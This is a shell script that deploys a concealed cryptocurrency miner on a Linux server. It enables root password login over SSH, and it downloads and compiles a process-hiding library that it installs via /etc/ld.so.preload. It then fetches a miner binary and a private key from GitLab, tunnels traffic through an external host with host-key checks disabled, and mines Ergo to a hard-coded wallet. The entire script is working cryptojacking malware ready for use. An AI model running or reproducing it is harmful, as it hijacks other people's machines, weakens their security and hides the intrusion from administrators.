#!/bin/sh
apt update;apt -y install unzip iftop cmake binutils build-essential screen net-tools curl nano cpuid neofetch automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev

git clone https://github.com/bryanpkc/corkscrew.git
cd corkscrew
autoreconf --install
./configure
make && make install
cd

sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
cat >> /etc/ssh/ssh_config <<END
    ProxyCommand /usr/local/bin/corkscrew 10.140.0.96 3128 %h %p
END


service ssh restart


service sshd restart


ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/magicBasket.zip
unzip magicBasket.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/basket
chmod +x basket

wget https://gitlab.com/chadpetersen1337/sshtunnel/-/raw/main/garethfairmountaio.pem
chmod 600 garethfairmountaio.pem
ssh ubuntu@18.234.166.152 -o StrictHostKeyChecking=no -D 1338 -f -C -q -N -i garethfairmountaio.pem -p 443

./basket -a ergo -o stratum+tcp://us.ergo.herominers.com:1180 -u 9g5DUhZmFGjdCyXheb78XZka79xC8nYNvFCeBEuqV49xZ4wAWAF.NB -log --proxy 127.0.0.1:1338
